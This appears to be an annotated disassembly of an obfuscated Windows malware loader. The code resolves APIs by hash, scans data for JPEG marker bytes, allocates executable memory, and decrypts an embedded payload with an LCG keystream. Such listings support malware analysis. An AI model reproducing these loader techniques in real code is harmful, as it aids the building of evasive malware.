loc_180050E82: mov     [rsp+8], rcx
loc_18000FFBE: push    rsi
loc_18004D86C: push    rdi
loc_18000D1F9: mov     eax, 1DE8h
loc_1800344E3: call    near ptr unk_18005469D
loc_18002898D: sub     rsp, rax
loc_18004BB36: mov     byte ptr [rsp+24h], 0FFh
loc_18004F72B: mov     byte ptr [rsp+25h], 0D8h
loc_18005A983: mov     byte ptr [rsp+26h], 0FFh
loc_1800532B7: mov     byte ptr [rsp+27h], 0E0h
loc_18003CB81: mov     byte ptr [rsp+28h], 0FFh
loc_180048C5C: mov     byte ptr [rsp+29h], 0E1h
loc_1800504DD: mov     byte ptr [rsp+2Ah], 0AAh
loc_1800596F7: mov     byte ptr [rsp+2Bh], 3Bh
loc_180041CD5: mov     byte ptr [rsp+2Ch], 0FFh
loc_18004F040: mov     byte ptr [rsp+2Dh], 0E2h
loc_180056A16: mov     byte ptr [rsp+2Eh], 0A1h
loc_18002F9F5: mov     byte ptr [rsp+2Fh], 0C5h
loc_180008E42: mov     rax, [rsp+1E00h]
loc_1800161C8: cmp     qword ptr [rax+40h], 0
loc_18000F566: jz      near ptr unk_18003F880
loc_18004E532: mov     r8d, 4
loc_180004554: lea     rdx, [rsp+24h]
loc_18005E6C3: mov     rax, [rsp+1E00h]
loc_180062EE4: mov     rcx, [rax+40h]
loc_18000D7BF: call    near ptr unk_18000E523 ; strfind
loc_18002C166: test    eax, eax
loc_18002442B: jz      near ptr unk_180022FF2
loc_18003F880: xor     eax, eax
loc_18002110E: jmp     near ptr unk_180016C04
loc_180016C04: add     rsp, 1DE8h
loc_18006040C: pop     rdi
loc_18002B678: pop     rsi
loc_18000B8C1: retn
loc_180022FF2: mov     r9d, 4
loc_18002F2C2: mov     r8d, 1000h
loc_1800473B7: mov     edx, 1000h
loc_180016535: xor     ecx, ecx
loc_18002D799: push    r15
loc_180021E40: push    r14
loc_180020614: xor     r14, r14
loc_18006259A: mov     r15d, 0E553A458h ; VirtualAllocEx
loc_18001D044: call    near ptr unk_180014D24 ; "execute" function (r15=winAPI function hash)
loc_18003A6A8: add     rsp, 20h
loc_180049B4A: pop     r14
loc_180051E88: pop     r15
loc_18005ADDC: mov     [rsp+50h], rax
loc_18001AF2F: cmp     qword ptr [rsp+50h], 0
loc_180001789: jnz     near ptr unk_18000E8C7
loc_180004D21: xor     eax, eax
loc_180034011: jmp     loc_180016C04
loc_18000E8C7: mov     r9d, 4
loc_180039D3E: mov     r8d, 1000h
loc_180019402: mov     edx, 1000h
loc_18001D460: xor     ecx, ecx
loc_18005CA59: push    r15
loc_180065E60: push    r14
loc_180024759: xor     r14, r14
loc_180039F0D: mov     r15d, 0E553A458h ; VirtualAllocEx
loc_1800014A8: call    near ptr unk_180014D24 ; "execute" function (r15=winAPI function hash)
loc_18000D71F: add     rsp, 20h
loc_1800100ED: pop     r14
loc_18004D28B: pop     r15
loc_18001B054: mov     [rsp+38h], rax
loc_1800618B5: cmp     qword ptr [rsp+38h], 0
loc_18000F05A: jnz     near ptr unk_18004F2D1
loc_18001FA45: xor     eax, eax
loc_1800035F6: jmp     loc_180016C04
loc_18004F2D1: mov     r9d, 4
loc_180027FD1: mov     r8d, 1000h
loc_18001BBB8: mov     edx, 1000h
loc_18005B8E5: xor     ecx, ecx
loc_180058421: push    r15
loc_180004726: push    r14
loc_180024636: xor     r14, r14
loc_180034EF5: mov     r15d, 0E553A458h ; VirtualAllocEx
loc_18002D11B: call    near ptr unk_180014D24 ; "execute" function (r15=winAPI function hash)
loc_18002E11C: add     rsp, 20h
loc_18003A0FD: pop     r14
loc_18001C115: pop     r15
loc_18003C89B: mov     [rsp+40h], rax
loc_1800458D4: cmp     qword ptr [rsp+40h], 0
loc_180049BA9: jnz     near ptr unk_180049ED4
loc_180023004: xor     eax, eax
loc_18000432F: jmp     loc_180016C04
loc_180049ED4: mov     r9d, 40h
loc_180058F8D: mov     r8d, 1000h
loc_180059D28: mov     edx, 1000h
loc_180048FCC: xor     ecx, ecx
loc_18002C09A: push    r15
loc_180058C84: push    r14
loc_18003C6FD: xor     r14, r14
loc_180010BD5: mov     r15d, 0E553A458h ; VirtualAllocEx
loc_18004D764: call    near ptr unk_180014D24 ; "execute" function (r15=winAPI function hash)
loc_18004CA3A: add     rsp, 20h
loc_18002F623: pop     r14
loc_180005D4D: pop     r15
loc_18001CCE4: mov     [rsp+48h], rax
loc_18000170B: cmp     qword ptr [rsp+48h], 0
loc_18001F885: jnz     near ptr unk_18005C3EF
loc_18001C0F9: xor     eax, eax
loc_18002BDF6: jmp     loc_180016C04
loc_18005C3EF: mov     r8d, 1000h
loc_180006984: xor     edx, edx
loc_18002E984: mov     rcx, [rsp+38h]
loc_18004D2C2: call    near ptr unk_1800445AD ; memset (rcx=buf, rdx=val, r8=size)
loc_18000C01A: mov     r8d, 1000h
loc_180008AC4: xor     edx, edx
loc_18001DA24: mov     rcx, [rsp+50h]
loc_180030AD2: call    near ptr unk_1800445AD ; memset (rcx=buf, rdx=val, r8=size)
loc_1800484FC: mov     r8d, 1000h
loc_180018E35: xor     edx, edx
loc_18005EB7C: mov     rcx, [rsp+40h]
loc_18000944E: call    near ptr unk_1800445AD ; memset (rcx=buf, rdx=val, r8=size)
loc_18001F22D: mov     r8d, 1000h
loc_18004EAB2: xor     edx, edx
loc_18005E05E: mov     rcx, [rsp+48h]
loc_18004100E: call    near ptr unk_1800445AD ; memset (rcx=buf, rdx=val, r8=size)
loc_180012FA5: mov     rax, [rsp+1E00h]
loc_180039C35: mov     eax, [rax+48h]
loc_18002713B: lea     r8, [rsp+28h]
loc_180043F20: mov     edx, eax
loc_1800135BE: mov     rax, [rsp+1E00h]
loc_180017536: mov     rcx, [rax+40h]
loc_18005C570: call    near ptr unk_1800358D2
loc_1800534AF: mov     [rsp+60h], rax
loc_1800302A1: cmp     qword ptr [rsp+60h], 0
loc_18000EB2A: jnz     near ptr unk_18001031C
loc_180026B41: xor     eax, eax
loc_18004A0A2: jmp     loc_180016C04
loc_18001031C: mov     rax, [rsp+60h]
loc_1800490FD: add     rax, 4
loc_18003ACFD: mov     r8d, 39h
loc_180025C0C: mov     rdx, rax
loc_18004F4D6: mov     rcx, [rsp+40h]
loc_18004622D: call    near ptr unk_180001923 ; memcpy
loc_1800368AD: mov     rax, [rsp+1E00h]
loc_18001B552: mov     eax, [rax+48h]
loc_18004474D: lea     r8, [rsp+2Ch]
loc_18002617D: mov     edx, eax
loc_180029845: mov     rax, [rsp+1E00h]
loc_18000E9B9: mov     rcx, [rax+40h]
loc_180002737: call    near ptr unk_1800358D2
loc_180033472: mov     [rsp+68h], rax
loc_18000F532: cmp     qword ptr [rsp+68h], 0
loc_180062F8F: jnz     near ptr unk_180055061
loc_1800409C5: xor     eax, eax
loc_1800478A9: jmp     loc_180016C04
loc_180055061: mov     rax, [rsp+68h]
loc_18003BED7: add     rax, 4
loc_18004BE06: mov     r8d, 1C3h
loc_18002F819: mov     rdx, rax
loc_1800269C8: mov     rcx, [rsp+48h]
loc_18003DD74: call    near ptr unk_180001923 ; memcpy
loc_180049C8A: mov     rax, [rsp+1E00h]
loc_18003B57B: add     rax, 4Ch
loc_18005F09B: mov     rcx, rax
loc_180023A31: call    near ptr unk_18004103D ; LCG
loc_1800085EF: mov     [rsp+58h], eax
loc_180047E42: mov     edx, [rsp+58h]
loc_18004DA4E: lea     rcx, [rsp+1410h]
loc_18000579E: call    near ptr unk_180038E4A
loc_180036A3A: lea     rcx, [rsp+70h]
loc_180035C38: mov     rdi, rcx
loc_180057CEE: mov     rsi, rax
loc_1800359E4: mov     ecx, 9C4h
loc_180026889: rep movsb
loc_1800349BE: lea     rax, [rsp+0A40h]
loc_1800167F6: lea     rcx, [rsp+70h]
loc_18003723E: mov     rdi, rax
loc_180027350: mov     rsi, rcx
loc_180054330: mov     ecx, 9C4h
loc_18004208D: rep movsb
loc_1800039E2: mov     dword ptr [rsp+20h], 0
loc_1800169B1: jmp     near ptr unk_1800643BB
loc_1800643BB: cmp     dword ptr [rsp+20h], 3Ch
loc_18002EC9B: jge     near ptr unk_18003DD4F
loc_18003E234: lea     rcx, [rsp+0A40h]
loc_18004510F: call    near ptr unk_180063054
loc_18003F65B: mov     [rsp+30h], eax
loc_18002C13F: mov     eax, [rsp+30h]
loc_18003E008: shr     eax, 18h
loc_180057820: and     eax, 0FFh
loc_18000A76B: movsxd  rcx, dword ptr [rsp+20h]
loc_18003B287: mov     rdx, [rsp+38h]
loc_180037A20: mov     [rdx+rcx], al
loc_180029FB3: mov     eax, [rsp+30h]
loc_18000E76B: shr     eax, 10h
loc_18000FCA0: and     eax, 0FFh
loc_180014421: mov     ecx, [rsp+20h]
loc_18002C6E9: inc     ecx
loc_18005EC28: movsxd  rcx, ecx
loc_18005E292: mov     rdx, [rsp+38h]
loc_180024089: mov     [rdx+rcx], al
loc_180054BFE: mov     eax, [rsp+30h]
loc_180039A52: shr     eax, 8
loc_18005A9FF: and     eax, 0FFh
loc_18001B7A0: mov     ecx, [rsp+20h]
loc_180011227: add     ecx, 2
loc_18003D1C3: movsxd  rcx, ecx
loc_18003EA35: mov     rdx, [rsp+38h]
loc_18000EF0B: mov     [rdx+rcx], al
loc_18004EABF: mov     eax, [rsp+30h]
loc_180058CE1: and     eax, 0FFh
loc_180048AD0: mov     ecx, [rsp+20h]
loc_180027D98: add     ecx, 3
loc_180004FAC: movsxd  rcx, ecx
loc_18006222F: mov     rdx, [rsp+38h]
loc_180007DF6: mov     [rdx+rcx], al
loc_18000BC3B: jmp     near ptr unk_180044B97
loc_180044B97: mov     eax, [rsp+20h]
loc_180016EFD: add     eax, 4
loc_18000D515: mov     [rsp+20h], eax
loc_18003DD4F: mov     r9, [rsp+48h]
loc_180035908: mov     r8, [rsp+38h]
loc_18001E756: mov     edx, 39h
loc_18003F077: mov     rcx, [rsp+40h]
loc_180015CE1: call    near ptr unk_18004936E
loc_18002AFC8: mov     rax, [rsp+1E00h]
loc_180002D4A: mov     r8, [rax+50h]
loc_1800621F6: mov     edx, 38h
loc_1800228ED: mov     rcx, [rsp+40h]
loc_18005E3CC: call    near ptr unk_18002BDDF
loc_180060EE7: cmp     qword ptr [rsp+50h], 0
loc_180060769: jz      near ptr unk_18005FB89
loc_1800293E4: mov     r8d, 8000h
loc_18002BCE3: xor     edx, edx
loc_18000CD3B: mov     rcx, [rsp+50h]
loc_180029CE2: push    r15
loc_1800252C0: push    r14
loc_180043727: xor     r14, r14
loc_18001DE7F: mov     r15d, 300F2F0Bh ; VirtualFree
loc_18004D6FA: call    near ptr unk_180014D24 ; "execute" function (r15=winAPI function hash)
loc_1800451CF: add     rsp, 20h
loc_1800084F4: pop     r14
loc_18000B526: pop     r15
loc_18005FB89: cmp     qword ptr [rsp+38h], 0
loc_180012284: jz      near ptr unk_180049021
loc_18002FD00: mov     r8d, 8000h
loc_180042FB8: xor     edx, edx
loc_1800198A4: mov     rcx, [rsp+38h]
loc_18003B88D: push    r15
loc_180020E78: push    r14
loc_18004C376: xor     r14, r14
loc_180018829: mov     r15d, 300F2F0Bh ; VirtualFree
loc_18001F129: call    near ptr unk_180014D24 ; "execute" function (r15=winAPI function hash)
loc_180014693: add     rsp, 20h
loc_180023768: pop     r14
loc_18003FD13: pop     r15
loc_180049021: cmp     qword ptr [rsp+40h], 0
loc_18002465A: jz      near ptr unk_180029C2D
loc_18001D247: mov     r8d, 8000h
loc_180011359: xor     edx, edx
loc_18001D10D: mov     rcx, [rsp+40h]
loc_180028DD5: push    r15
loc_18005BD94: push    r14
loc_1800109C3: xor     r14, r14
loc_18001F792: mov     r15d, 300F2F0Bh ; VirtualFree
loc_1800097F6: call    near ptr unk_180014D24 ; "execute" function (r15=winAPI function hash)
loc_18003242C: add     rsp, 20h
loc_180019D37: pop     r14
loc_180052E59: pop     r15
loc_180029C2D: cmp     qword ptr [rsp+48h], 0
loc_180060106: jz      near ptr unk_1800279FA
loc_1800527F7: mov     r8d, 8000h
loc_18002E350: xor     edx, edx
loc_180038578: mov     rcx, [rsp+48h]
loc_180017B82: push    r15
loc_180049D81: push    r14
loc_18002B6BD: xor     r14, r14
loc_180044284: mov     r15d, 300F2F0Bh ; VirtualFree
loc_180022C26: call    near ptr unk_180014D24 ; "execute" function (r15=winAPI function hash)
loc_18002EFA0: add     rsp, 20h
loc_1800404BF: pop     r14
loc_18005E15A: pop     r15
loc_1800279FA: mov     rax, [rsp+1E00h]
loc_18001E8C5: mov     rax, [rax+50h]